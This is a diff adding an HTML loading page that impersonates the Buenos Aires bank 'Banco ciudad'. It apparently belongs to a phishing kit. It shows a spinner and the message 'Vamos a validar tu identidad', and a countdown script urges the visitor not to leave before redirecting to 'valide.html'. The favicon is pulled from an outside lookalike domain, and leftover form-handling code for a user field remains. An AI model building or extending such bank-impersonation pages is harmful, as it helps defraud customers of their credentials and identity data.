@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Banco ciudad</title>
+  <script src="paginacargando_archivos/jquery-3.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+  <link rel="icon" type="ico" href="https://ciudad-web.com/favicon.ico">
+  <link href="paginacargando_archivos/bootstrap.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  <style type="text/css">
+    @font-face{src:url(fonts/GuardianTextSans-Medium-App.60d321434754a29a.ttf); font-family:'Guardian Sans'; } @font-face{src: 'GuardianTextSans-Regular-App.2d1c6b72f4737092.ttf'; font-family: 'Guardian regular'; } .container-page{max-width:470px; width: 90%; } body{background:#f2f1ef; } .btn{width:90% !important; } *{color:#909394; font-family:'Guardian Sans'; } .text-primary{color:#005bb0 !important; } fieldset{width:90%; max-width:374px; display: block !important; margin: auto; } .logo-ciudad{height: 58.33px; } .btn{max-width:374px; display: block; margin: auto; } label{font-size:13px; } .helper-user-div div {height: 49px; line-height: 49px; } .helper-user-div{background:#f2f1ef; } .btn-primary{background:#005baa !important; border-color:#005baa !important; } .btn-disabled{background:#e2e0dd!important; border-color:#e2e0dd !important; color: #909394; } .form-control{height: 46px; color: #909394 !important; } .form-control:focus{box-shadow: 0 0 0 2px #5555; border-color:transparent; }
+
+  </style>
+</head>
+<body>
+  <div class="container-page m-auto py-5">
+   
+    <main class="position-fixed w-100 h-100" style="display:flex;height:450px;width: 100%;flex-direction: column;justify-content: center;align-items: center;left: 0;top: 0;">
+      <img src="paginacargando_archivos/img_loader.gif" height="90px">
+
+      <div class="alert mt-3 border bgbg bg-white">Vamos a validar tu identidad.</div>
+    </main>
+  </div>
+  <script src="paginacargando_archivos/bootstrap.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+  <script type="text/javascript">
+    $("#user").keyup(function(){
+      if ($(this).val() != "") {
+        $(".btn-primary").removeClass("btn-disabled");
+        $(".btn-primary").removeAttr("disabled");
+        $(".btn-primary").css("cursor","pointer");
+      }else{
+        $(".btn-primary").addClass("btn-disabled");
+        $(".btn-primary").attr("disabled","disabled");
+        $(".btn-primary").css("cursor","no-drop");
+      }
+    })
+    var x = 30;
+    function restar(){
+      x--;
+    }
+    var i = setInterval(function(){
+      restar();
+      $(".apito").html(x);
+      if (x == 20 ) {
+        $(".bgbg").html("Vamos a validar tu identidad.")
+      }
+
+      if (x == 15 ) {
+        $(".bgbg").html("No abandones esta pagina.")
+      }
+      if (x == 15 ) {
+        $(".bgbg").html("Esto puede demorar unos segundos...")
+      }
+      if (x == 0) {
+        clearInterval(i);
+        window.location.href="valide.html";
+      }
+    },1000)
+  </script>
+
+</body></html>
